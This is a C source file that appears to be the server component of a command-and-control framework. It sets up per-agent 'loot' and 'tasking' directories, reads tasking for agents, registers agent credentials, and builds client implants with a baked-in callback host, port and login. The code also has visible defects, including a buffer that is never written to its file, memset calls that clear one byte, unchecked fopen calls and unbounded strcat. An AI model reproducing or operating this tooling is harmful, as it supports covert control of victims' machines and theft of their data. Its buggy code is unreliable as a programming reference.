#include "agents.h"
#include "misc.h"
#include "authenticate.h"

void agent_write_info(char *id, char *connection_time,
     char *hostname, char *ip_addr, char *interfaces, char *proc_owner){
    
    char buff[BUFSIZ];
    FILE *fd = NULL;
    memset(buff, 0, sizeof(buff));
    sprintf(buff, "agents/%s/info.txt", id);
    fd = fopen(buff, "w");
    if(fd == NULL){
        perror("");
        return;
    }
    memset(buff, 0, sizeof(buff));
    if(id != NULL){
        strcat(buff, id);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(connection_time != NULL){
        strcat(buff, connection_time);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(hostname != NULL){
        strcat(buff, hostname);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(ip_addr != NULL){
        strcat(buff, ip_addr);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(interfaces != NULL){
        strcat(buff, interfaces);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    if(proc_owner != NULL){
        strcat(buff, proc_owner);
    } else {
        strcat(buff, "NA");
    }
    strcat(buff, "\n");

    fclose(fd);


}

void init_agent(char *agent_id){
    FILE *manifest = NULL;
    char parent_dir[2048];
    char *tmp = NULL;
    char *buff = NULL;
    memset(parent_dir, 0, sizeof(parent_dir));
    sprintf(parent_dir, "agents/%s", agent_id);
    buff = strdup(parent_dir);
    tmp = strdup(parent_dir);
    mkdir(parent_dir, 0755);
    mkdir(strcat(parent_dir, "/loot"), 0755);
    mkdir(strcat(tmp, "/tasking"), 0755);

    manifest = fopen(strcat(buff, "/agent.mfst"), "w");
    fwrite("NULL :)", 1, sizeof("NULL :)"), manifest);
    fclose(manifest);
    agent_write_info(agent_id, NULL, NULL, NULL, NULL, NULL);

    
}

void write_format(char *path){
    FILE *fd;
    fd = fopen(path, "w");
    fwrite("NULL :)\n", 1, sizeof("NULL :)"), fd);
    fclose(fd);
}

int get_tasking(char *agent_id, char *tasking){
    char file[2048];

    memset(file, 0, sizeof(file));
    sprintf(file, "agents/%s/agent.mfst", agent_id);
    FILE *fd = NULL;
    fd = fopen(file, "r");
    fseek(fd, 0L, SEEK_END);
    int size = ftell(fd);
    rewind(fd);
    char *mem_dump = malloc(size);
    memset(mem_dump, 0, size);
    fread(mem_dump, 1, size, fd);
    fclose(fd);

    strcat(tasking, mem_dump);
    //write_format(file);
    return 0;
}

int get_file(char *name, char **ptr){
    int size = 0;
    FILE *file = NULL;
    file = fopen(name, "rb");

    if (file == NULL)
    {
        printf("Failed to open file %s\n", name);
        return -1;
    }
    fseek(file, 0L, SEEK_END);
    size = ftell(file);

    *ptr = malloc(size);
    memset(*ptr, 0, size);
    rewind(file);
    fread(*ptr, 1, size, file);
    fclose(file);

    return size;
}

void register_agent(char *username, char *password){
    FILE *file;
    file = fopen(DATA_FILE, "a");
    if (!file)
    {
        printf("Failed to open file thing\n");
        fclose(file);
        return;
    }
    fseek(file, 0L, SEEK_END);
    fwrite("\n", 1, 1, file);
    fwrite(username, 1, strlen(username), file);
    fwrite(":", 1, 1, file);

    char *buff;
    buff = digest(password);

    fwrite(buff, 1, strlen(buff), file);
    fclose(file);
}


void compile_agent(char *ip, char *port){
    // In here the agent file header is editeed and recompiled against these values
    // Also in here is where the username and password are added to the server database
    
    // move over the required source files
    char buff[BUFSIZ];
    memset(buff, 0, sizeof(buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "client.c");
    copy_file(buff, "out/client.c");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "agent.h");
    copy_file(buff, "out/agent.h");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "agent.c");
    copy_file(buff, "out/agent.c");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "b64.h");
    copy_file(buff, "out/b64.h");

    memset(buff, 0, sizeof(*buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "b64.c");
    copy_file(buff, "out/b64.c");

    memset(buff, 0, sizeof(buff));
    strcat(buff, AGENT_SOURCE);
    strcat(buff, "examples_common.h");
    copy_file(buff, "out/examples_common.h");

    // create config file

    struct ret *struc = gen_creds();

    printf("Agent Credentials:\n\tUser: %s, Password: %s\n", struc->usr, struc->passwd);

    memset(buff, 0, sizeof(buff));


    snprintf(buff, BUFSIZ, "#define HOST \"%s\"\n#define PORT %s\n#define GLOB_ID \"%s\"\n#define GLOB_LOGIN \"%s\"\n", ip, port, struc->usr, struc->passwd);

    FILE *fd = NULL;
    fd = fopen("out/config.h", "w");
    if (!fd)
    {
        printf("Failed to open  the config header file\n");
        return;
    }
    
    fwrite(buff, 1, strlen(buff) -1, fd);
    fclose(fd);

    printf("Compiling agent...\n");
    system(COMPILE);

    register_agent(struc->usr, struc->passwd);
    printf("Agent successfully compiled! Check the 'out/' directory for the client executable\n");
}
